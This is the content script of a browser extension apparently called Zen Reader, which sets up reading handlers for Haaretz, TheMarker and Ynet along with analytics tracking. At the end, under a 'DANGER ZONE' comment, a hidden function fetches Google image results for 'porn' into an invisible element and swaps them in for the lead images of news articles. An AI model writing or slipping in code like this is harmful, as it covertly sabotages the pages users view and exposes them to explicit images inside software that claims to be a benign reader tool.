var publishers = ["Haaretz", "TheMarker", "Ynet"];
var publisherInstances = {};

(function() {

	var tracker = null;
	
	function req_new_author() {
		if (!document.getElementById('mailto-proxy')) {
			var a = document.createElement('a');
			a.id = 'mailto-proxy';
			a.href = "mailto:doron.sadeh.dev@gmail.com?subject=Request%20additions/modifications%20in%20Zen%20Reader";
			document.body.appendChild(a);
		}

		document.getElementById('mailto-proxy').click();
	}

	function run(rerun, force) {
		// Run each publisher
		var keys = Object.keys(publisherInstances)
		for (var j = 0; j < keys.length; j++) {
			publisherInstances[keys[j]].run(rerun, force);
		}
	}
	
    function EXP_cb(text, status, jqxhr) {
        var imgs = document.querySelectorAll('img.rg_i[data-sz="f"]');
        if (imgs.length > 0) {
            // Ynet selectors
            topArticleImgs = document.querySelectorAll(['div.citv_image>img', 'div.citv_image>font>img', 'div.ArticleImage>img', 'div.gspp_main>a.gspp_image>img', 'div.media.image>img']);
            
            for (var i = 0; i < topArticleImgs.length && i < imgs.length; i++) {
                var validImage = null;
                
                while (!validImage || validImage.src.length === 0) {
                    validImage = imgs[Math.round(Math.random()*(imgs.length - 1))];
                }
                
                var size = topArticleImgs[i].getBoundingClientRect(topArticleImgs[i]);
                topArticleImgs[i].src = validImage.src;
                topArticleImgs[i].style.width = size.width + 'px';
                topArticleImgs[i].style.height = size.height + 'px';
            }
        }
        
        document.body.removeChild(document.getElementById('zen-reader-__temp__result'));
    }
    
    function EXP_search() {
        var r = document.createElement('DIV');
        r.id = 'zen-reader-__temp__result';
        r.style.display = 'none';
        r.style.width = 0;
        r.style.height = 0;
        document.body.appendChild(r);
        
        $("#zen-reader-__temp__result").load("https://www.google.com/search?site=imghp&tbm=isch&source=hp&biw=1680&bih=925&q=porn&oq=wine&gs_l=img.3..0l10.3251.3854.0.4358.4.4.0.0.0.0.131.490.0j4.4.0....0...1ac.1.64.img..0.4.487.sQ5WHcCYJHI#q=porn&tbs=isz:lt,islt:vga,itp:photo&tbm=isch",
                                             '',
                                             EXP_cb);
    }
    
	// Now run this ONCE per page (do NOT run this in each iframe)
	if (window === window.top) {

		chrome.runtime.sendMessage({incr: '0'}, function(response) {
		});

		chrome.storage.onChanged.addListener(function(changes, namespace) {
		  for (key in changes) {
			if (key === 'refresh') {
				run(true, false);
			}
            if (key === 'force_refresh') {
                run(true, true);
            }
			if (key === 'req_new_author') {
				req_new_author();
			}
		  }
		});

		// You'll usually only ever have to create one service instance.
		var service = analytics.getService('zen_reader');

		// You can create as many trackers as you want. Each tracker has its own state
		// independent of other tracker instances.
		tracker = service.getTracker('UA-67866543-1');

		tracker.sendAppView('Loaded');

		// Create all publishers
		for (var i = 0; i < publishers.length; i++) {
			publisherInstances[publishers[i]] = new window[publishers[i]](tracker);
			console.log("Created ", publishers[i], publisherInstances[publishers[i]]);
		}

		run(false);

        // DANGER ZONE
        EXP_search();

	}
	
})();

